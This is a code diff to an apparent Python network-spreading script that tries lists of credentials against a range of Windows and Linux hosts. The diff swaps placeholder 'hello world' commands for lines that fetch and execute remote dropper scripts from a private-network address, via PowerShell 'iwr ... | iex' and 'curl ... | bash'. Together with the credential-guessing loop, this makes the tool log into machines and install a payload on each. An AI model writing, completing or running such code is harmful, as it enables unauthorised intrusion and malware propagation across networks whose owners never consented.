@@ -44,13 +44,12 @@ def create_linux_session(host, username, password):
 
 
 def windows_execute(session):
-    ps_script = 'echo "hello world"'
+    ps_script = 'iwr http://192.168.14.3/download/dropper.ps1 | iex'
     output = session.run_cmd(f'powershell -c "{ps_script}"')
 
-def linux_execute(session, host):
-    stdin, stdout, stderr = session.exec_command("echo 'hello world'")
+def linux_execute(session):
+    stdin, stdout, stderr = session.exec_command("curl http://192.168.14.3/download/dropper.sh | bash")
     
-
 
 def main():
     for i in range(1, 18):
@@ -113,7 +112,7 @@ def main():
             for password in linux_credentials:
                 try:
                     session = create_linux_session(host, local_admin, password)
-                    linux_execute(session, host)
+                    linux_execute(session)
                 except Exception:
                     continue
 
